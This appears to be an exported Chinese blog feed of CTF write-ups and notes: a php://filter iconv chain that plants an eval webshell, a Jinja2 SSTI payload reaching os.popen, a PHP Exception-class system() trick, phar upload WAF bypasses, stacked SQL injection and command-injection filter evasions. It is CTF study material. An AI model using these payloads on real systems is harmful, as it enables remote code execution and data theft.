<h1 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h1><p>这题和上一题应该是联动的，这题打开会发现是应该LFI而上面构造的文章原本讲的就是从LFI到RCE的漏洞升级使用我们直接构造&lt;?php @eval($_POST[1]);?&gt;来进行文件包含到命令执行。<br>之后再执行/readflag即可<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;1=system(&quot;/readflag&quot;);</span><br></pre></td></tr></table></figure></p>
<h1 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a>give me flag</h1><p>这题考的是哈希扩展攻击，这个我再博客里也又写原理。我这里就直接写思路了<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">5</span>c44b944c29af7cb3dfa247a0c2a84c7</span><br></pre></td></tr></table></figure><br>首先其泄露了flag的哈希值。我们再看一下其他题目的flag就知道flag长度为43个字符。<br>而其判断语句比较了以下两个值<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span></span><br></pre></td></tr></table></figure><br>value我们可控，而time我们只要再后面拼接一个当前time几十秒的数据之后一直发包即可。（本来是想用python脚本来直接讲time填充的字符拼接之后发包的但是网上简单的脚本我因为环境的原因都无法正常使用，而复杂的开源脚本看不懂。。。）<br>我们这里使用的是hash-ext-attack<br><br>之后就是不断的发包登time输入的与扩展字符相同时即可得出答案。</p>
<h1 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h1><p>首先是爆破登陆。<br>之后会有一个复读的框。看到这个的时候第一时间就有想到使用ssti。因为复读这种直接输出到web上的一般都是使用模板来实现的。可是测试之后发现无法使用<code>&#123;&#125;</code>这也就导致完全卡住了。但是我们观察题目说的他只能复读英文，那么输入中文会发生上面呢?。结果就发现输入中文会使得多出一个<code>&#123;&#125;</code>那么我们输入两个中文字符即可得到<code>&#123;&#123;&#125;&#125;</code>那么就可以进行ssti了。在进行ssti时发现过滤了很多，但是没关系我们直接使用请求来逃逸<br>payload<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">得到()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(<span class="number">80</span>)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=<span class="built_in">eval</span>&amp;x9=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls /&quot;</span>).read()</span><br></pre></td></tr></table></figure></p>
<h1 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure>
<p>我们可以看到其一开始直接new来进行实例一个对象。那么我们很自然的想到使用原生类。我们观察这个构造可以知道需要利用两个括号内的返回值来构造命令。<br>我们的目标命令就是system(‘cat /flag’);<br>即前一个返回值为system后一个为cat /flag<br>而控制返回值让我想到了Error类，其tostring方法就是返回参数内容，那么我们看一下其是否存在其他的方法<br>我们翻一下php手册会发现其存在类可以返回string<br><br>Exception类也一样<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9502/?a=Exception&amp;aa=system&amp;c=getMessage&amp;b=Exception&amp;bb=tac /flag</span><br></pre></td></tr></table></figure></p>
<h1 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h1><p>这题我们看hint.php可以发现其只能使用特殊字符来构造命令。<br>我们知道<code>$()</code>可以表示bash。那么我们使用<code>$()</code>来尝试进行命令执行。而在Makefile里<code>$&lt;</code>表示第一个依赖项（一般是构造目标文件）<br><br>我们可以发现第一个依赖性为/flag即<code>$&lt;</code>为/flag。那么我们可以使用重定向符&lt;来进行命令执行<br>我们查看下面这个命令<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(&lt;file)</span><br></pre></td></tr></table></figure><br>在bash中这是将file的内容当成命令执行，当无法执行时就会报错而报错的内容里就含有文件的内容。<br>那么我们只要能构造出效果和<code>$(&lt;/flag)</code>相同的即可得到flag。<br>而在makefile下$$<code>代表引用变量使用我们需要使用</code>$$$来代替<code>$</code>那么我们就得到了下面的命令<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><br>这就会报错并回显出flag</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>XY学到的知识</title>
    <url>/2024/04/14/XY%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="感觉自己越来越懒了这个文件创建了很久，但是一直没有做好总结"><a href="#感觉自己越来越懒了这个文件创建了很久，但是一直没有做好总结" class="headerlink" title="感觉自己越来越懒了这个文件创建了很久，但是一直没有做好总结"></a>感觉自己越来越懒了这个文件创建了很久，但是一直没有做好总结</h1><h1 id="1-rce后拼接字符时绕过的方法"><a href="#1-rce后拼接字符时绕过的方法" class="headerlink" title="1.rce后拼接字符时绕过的方法"></a>1.rce后拼接字符时绕过的方法</h1><p>在xy时我碰到了新的绕过方法，之前我有了解到可以使用#和短标签&lt;?=?&gt;来进行绕过，但这次比赛并不可以。于是我就在网上找到了这个新方法。</p>
<h2 id="使用phar文件尾来截断代码，实现绕过。"><a href="#使用phar文件尾来截断代码，实现绕过。" class="headerlink" title="使用phar文件尾来截断代码，实现绕过。"></a>使用phar文件尾来截断代码，实现绕过。</h2><p>如标题当php文件在执行代码时遇到phar文件尾时效果与?&gt;相似不会解析后面的代码也就不会出现后面的报错。<br><img src="/2024/04/14/XY%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86/phar1.png" class="" title="alt text"><br>我们可以发现即使在文件尾后面出现严重的语法错误也不会报错程序会正常运行<br>那么在遇到如下代码时我们就可以尝试使用这个方法绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[cmd];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/#|&lt;|&gt;/&quot;</span>,<span class="variable">$cmd</span>);)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>.<span class="string">&quot;lalalala&quot;</span>);</span><br></pre></td></tr></table></figure><br>当遇到如上的题目即可使用该方法绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=phpinfo();__HALT_COMPILER();</span><br></pre></td></tr></table></figure></p>
<h1 id="2-在文件包含时使用php-filter伪协议的过滤器来任意构造字符串。"><a href="#2-在文件包含时使用php-filter伪协议的过滤器来任意构造字符串。" class="headerlink" title="2.在文件包含时使用php://filter伪协议的过滤器来任意构造字符串。"></a>2.在文件包含时使用php://filter伪协议的过滤器来任意构造字符串。</h1><p><a href="https://tttang.com/archive/1395/#toc_php-base64-filter">hxp CTF 2021 - The End Of LFI?</a><br>这篇文章写了在进行LFI进行文件包含时使用filter过滤器来构造字符。实现从文件包含到命令执行的漏洞升级。（只能说真的酷）<br>器原理时借助字符集转换时产生的一些字母，并使用convert.base64-encode过滤器会将非base64字符的给进行清除的特性来构造出字符。重复以上步骤就可以构造出自己想构造的字符。（发现这个的人太强了。orz）<br>在XY中考察的是利用过滤器和/etc/passwd文件构建XYCTF。这个构建方法光看文章是无法实现的。但是看着文章进行理解思考就可以写出来<br>这里我还有贴一下p牛的文章<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#reply-list">谈一谈php://filter的妙用</a><br>只能说p牛不愧是p牛大佬好几年前玩剩下的，都够我这个渣渣喝上一壶<br>这篇文章提到了利用convert.base64-encode的宽泛性和string.strip_tags来绕过死亡exit<br>其中string.strip_tags可以直接删除标签内的内容，即其会删除如下字符串<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phplalalalalla?&gt;</span><br><span class="line">&lt;?lalallalalal</span><br></pre></td></tr></table></figure><br>那么我们只要构造出XYCTF&lt;?再加上这个过滤器不就迎刃而解了吗？</p>
<h1 id="3-phar文件上传时的一些绕waf小技巧"><a href="#3-phar文件上传时的一些绕waf小技巧" class="headerlink" title="3.phar文件上传时的一些绕waf小技巧"></a>3.phar文件上传时的一些绕waf小技巧</h1><p>参考文章<a href="https://www.freebuf.com/articles/web/291992.html">phar反序列化总结</a></p>
<h2 id="1-后缀或者文件头验证"><a href="#1-后缀或者文件头验证" class="headerlink" title="1.后缀或者文件头验证"></a>1.后缀或者文件头验证</h2><p>phar文件的识别和使用phar://伪协议来时matedata序列化只与其文件尾有关即我们可以再文件头部添加照片文件的文件头或者随意修改后缀其并不影响其phar://对其的处理</p>
<h2 id="2-检测phar文件尾"><a href="#2-检测phar文件尾" class="headerlink" title="2.检测phar文件尾"></a>2.检测phar文件尾</h2><p>phar文件是必须要有文件尾才可以被phar://所识别，使用我们的phar文件是必须有<strong>HALT_COMPILER()，绕过方式也不难可以使用liunx的gzip来压缩文件，再压缩之后就不存在</strong>HALT_COMPILER()了，而且仍然可以被phar://所处理。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gzip phar.phar</span><br></pre></td></tr></table></figure></p>
<h2 id="3-无法再开头使用phar-来触发"><a href="#3-无法再开头使用phar-来触发" class="headerlink" title="3.无法再开头使用phar://来触发"></a>3.无法再开头使用phar://来触发</h2><p>这个的绕过方法有很多因为其只检测其是否在开头，我们只要使用伪协议嵌套即可绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> Bzip/Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span><br><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line">// 还可以使用伪协议的方法绕过</span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></p>
<h1 id="4-反序列化的小trick-还可以使用伪协议的方法绕过"><a href="#4-反序列化的小trick-还可以使用伪协议的方法绕过" class="headerlink" title="4.反序列化的小trick// 还可以使用伪协议的方法绕过"></a>4.反序列化的小trick// 还可以使用伪协议的方法绕过</h1><p>参考文章<a href="https://m.freebuf.com/articles/web/338693.html">反序列化及常用trick</a><br>在写xy php套娃的题目时耗时最久的不是最后一个而是第一个，其中一个非常简单的trick给我搞忘了，这里记录一下</p>
<h2 id="使用-amp-来传址使得两个属性的值始终相等"><a href="#使用-amp-来传址使得两个属性的值始终相等" class="headerlink" title="使用&amp;来传址使得两个属性的值始终相等"></a>使用&amp;来传址使得两个属性的值始终相等</h2><p>学过c语言对传址应该不陌生即<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_POST[1];</span><br><span class="line">$b=&amp;$a;</span><br></pre></td></tr></table></figure><br>这时随便修改变量a，b也会发生改变</p>
<h1 id="5-ssti的绕waf技巧"><a href="#5-ssti的绕waf技巧" class="headerlink" title="5.ssti的绕waf技巧"></a>5.ssti的绕waf技巧</h1><p>这个的内容有点太多了我就直接贴我看的文章就好了<br><a href="https://xz.aliyun.com/t/9584?time__1311=n4%2BxuDgD9ADtDQII40ywbDyiDRlDclAmxEGYD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-26">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a><br>这篇文章几乎将所有的bypass技巧写了下来</p>
]]></content>
      <categories>
        <category>trick</category>
        <category>XY</category>
      </categories>
      <tags>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>buu上的一些题目</title>
    <url>/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<h1 id="强网杯2019随便注"><a href="#强网杯2019随便注" class="headerlink" title="强网杯2019随便注"></a>强网杯2019随便注</h1><p>这道题目我们进行常规的一些尝试发现时是<code>&#39;</code>闭合的注入接下来就是一些常规的操作，但是当我们输入select是发现select杯过滤了，而且是使用正则表达式，忽略大小写的过滤。发现怎么也绕不过，这时候我们就可以尝试使用堆叠注入，堆叠注入的原理在sqli-labs中也大致学过了只是学的很浅，我们可以先使用堆叠注入来查看该数据库的内容。<br>1.show tables爆表名。<br>表名为words和一串数字。<br>2.show columns from words;show columns from `1919810931114514`<br>words的内容为<br><img src="/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/1.png" class="" title="Alt text"><br>这时候我们不妨猜测words的id就是我们在搜索框输入的1，words的data就是我们搜索到的内容<br>1919810931114514的内容<br><img src="/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/1-2.png" class="" title="Alt text"><br>我们查到flag在1919810931114514里，但是一个问题就是select被禁了我们该怎么查询这个表，这时候我们可以利用网页自带的查询，我们可以猜测一下查询语句为<code>select data from words where id=&#39;$inject&#39;</code>这时候我们只需要使用堆叠注入将words随便改个名字，将1919810931114514改为words，然后再将flag改为data，给被改为words的1919810931114514里加一个会自增的id，这时候我们再搜索框输入1时输出的其实时flag再第一行的内容。<br>注意我们需要将使用语句写成一行因为如果先将words进行改名，那么后端的查询语句会因为无法查询到words而无法运行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to a;rename table `1919810931114514` to words;alter table words change flag data varchar(100);alter table words add id int unsigned not Null auto_increment primary key--+</span><br></pre></td></tr></table></figure><br><img src="/2023/12/23/buu%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/1-3.png" class=""><br>得到flag</p>
<h2 id="法二使用16进制进行绕过"><a href="#法二使用16进制进行绕过" class="headerlink" title="法二使用16进制进行绕过"></a>法二使用16进制进行绕过</h2><h2 id="法三使用handler进行查询"><a href="#法三使用handler进行查询" class="headerlink" title="法三使用handler进行查询"></a>法三使用handler进行查询</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">handler table_name <span class="keyword">open</span>;handler table_name read <span class="keyword">first</span>;handler table_name <span class="keyword">close</span>;#首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。</span><br><span class="line">handler table_name <span class="keyword">open</span>;handler table_name read next;handler table_name <span class="keyword">close</span>;#首先打开数据库，开始循环读取，读取成功后进行关闭操作。</span><br></pre></td></tr></table></figure>
<p>使用handler进行查询进行读取flag所在的表的内容。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">handler <span class="number">1919810931114514</span> <span class="keyword">open</span>;handler <span class="number">1919810931114514</span> read <span class="keyword">first</span>;handler <span class="number">1919810931114514</span> <span class="keyword">close</span>;#首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。</span><br><span class="line">handler <span class="number">1919810931114514</span> <span class="keyword">open</span>;handler <span class="number">1919810931114514</span> read next;handler <span class="number">1919810931114514</span> <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure></p>
<h1 id="pingpingping"><a href="#pingpingping" class="headerlink" title="pingpingping"></a>pingpingping</h1><p>该题我们输入<code>?ip=|ls</code>发现flag.php和index.php<br>我们使用<code>?ip=|cat flag.php</code><br>发现无法输入空格<br>我们可以使用<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure><br>来绕过空格<br>输入<code>?ip=|cat$IFS$1flag.php</code>发现连flag也被过滤<br>我们先打开index.php<br>发现代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现其过滤了很多。我们有以下几种方法来进行。</p>
<h2 id="1-内敛绕过"><a href="#1-内敛绕过" class="headerlink" title="1.内敛绕过"></a>1.内敛绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=|cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>
<h2 id="2-我们可以看到代码中存在变量a我们可以以如下方法绕过"><a href="#2-我们可以看到代码中存在变量a我们可以以如下方法绕过" class="headerlink" title="2.我们可以看到代码中存在变量a我们可以以如下方法绕过"></a>2.我们可以看到代码中存在变量a我们可以以如下方法绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=1;a=g;cat$IFS$1fla$a.php;</span><br></pre></td></tr></table></figure>
<h2 id="使用sh来绕过"><a href="#使用sh来绕过" class="headerlink" title="使用sh来绕过"></a>使用sh来绕过</h2><p>bash和sh都可以这样子运行由于其绕过了bash所以我们可以使用sh<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure></p>
